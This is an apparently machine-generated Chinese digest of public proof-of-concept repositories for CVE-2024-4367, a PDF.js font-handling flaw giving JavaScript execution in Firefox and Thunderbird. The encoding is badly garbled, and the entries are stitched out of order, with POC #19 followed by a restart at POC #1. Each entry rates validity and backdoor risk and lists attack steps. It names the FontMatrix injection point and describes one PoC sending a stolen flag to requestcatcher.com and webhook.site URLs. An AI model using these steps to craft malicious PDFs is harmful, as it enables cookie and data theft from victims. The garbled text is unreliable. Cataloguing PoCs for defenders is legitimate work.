CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

